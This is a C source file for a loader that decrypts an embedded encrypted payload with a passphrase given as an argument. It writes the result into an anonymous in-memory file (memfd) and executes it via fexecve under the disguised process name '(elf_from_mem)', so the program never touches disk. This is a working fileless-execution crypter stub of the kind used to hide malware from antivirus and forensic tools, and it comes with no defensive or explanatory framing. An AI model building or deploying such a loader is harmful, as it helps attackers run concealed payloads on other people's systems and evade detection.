#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h> // For syscall and SYS_memfd_create
#include <sys/wait.h>
#include <string.h>
#include <errno.h>

#include "payload.h"

// Define MFD_CLOEXEC if not already defined (e.g., by <sys/memfd.h>)
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static inline int create_memory_fd(const char *name, unsigned int flags) {
    int fd = syscall(SYS_memfd_create, name, flags);
    if (fd == -1) {
        perror("memfd_create (via syscall) failed");
    }
    return fd;
}

void decrypt_data(unsigned char *data, size_t data_len, const char *passphrase);

int main(int argc, char *argv_main[]) {
    int fd;
    ssize_t n_written;
    pid_t pid;
    const char *decryption_key_string;

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <decryption_key> [payload_args...]\n", argv_main[0]);
        return EXIT_FAILURE;
    }
    decryption_key_string = argv_main[1];

    if (enc_payload_len == 0) {
        fprintf(stderr, "Error: payload_len is 0. Is payload.h correctly generated and included?\n");
        return EXIT_FAILURE;
    }

    unsigned char *decrypted_data = malloc(enc_payload_len);
    if (!decrypted_data) {
        perror("Failed to allocate memory for decrypted_data");
        return EXIT_FAILURE;
    }
    memcpy(decrypted_data, enc_payload, enc_payload_len);

    // Decrypt the copy
    decrypt_data(decrypted_data, enc_payload_len, decryption_key_string);

    fd = create_memory_fd("my_ram_exe", MFD_CLOEXEC);
    if (fd == -1) {
        free(decrypted_data);
        return EXIT_FAILURE;
    }

    // Write the decrypted data to memfd
    n_written = write(fd, decrypted_data, enc_payload_len);
    free(decrypted_data);

    if (n_written == -1 || n_written != (ssize_t)enc_payload_len) {
        perror("write to memfd failed or partial write");
        close(fd);
        return EXIT_FAILURE;
    }

    pid = fork();
    if (pid == -1) {
        perror("fork failed");
        close(fd);
        return EXIT_FAILURE;
    }

    if (pid == 0) { // Child process
        // Adjust argc for the child: it's the original argc minus 1 (for the key)
        // plus 1 (for the new argv[0]) minus 1 (for the program name itself).
        // So, effectively, original argc - 1.
        int child_argc = argc - 1;
        char **child_argv = malloc((child_argc + 1) * sizeof(char *));
        if (!child_argv) {
            perror("malloc for child_argv failed");
            close(fd);
            _exit(127);
        }

        child_argv[0] = "(elf_from_mem)";
        // Pass remaining arguments (argv_main[2] onwards) to the child
        for (int i = 0; i < child_argc -1; i++) {
            child_argv[i + 1] = argv_main[i + 2];
        }
        child_argv[child_argc] = NULL;

        char *child_envp[] = {"CUSTOM_VAR=SetByParentRunner", "PATH=/usr/bin:/bin", NULL};

        fexecve(fd, child_argv, child_envp);
        perror("fexecve failed");
        free(child_argv);
        close(fd);
        _exit(127);
    } else { // Parent process
        close(fd);
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            printf("Parent: Child exited with status %d\n", WEXITSTATUS(status));
        } else if (WIFSIGNALED(status)) {
            printf("Parent: Child terminated by signal %d (core dumped: %s)\n", WTERMSIG(status), WCOREDUMP(status) ? "yes" : "no");
        } else {
            printf("Parent: Child terminated abnormally\n");
        }
    }
    return EXIT_SUCCESS;
}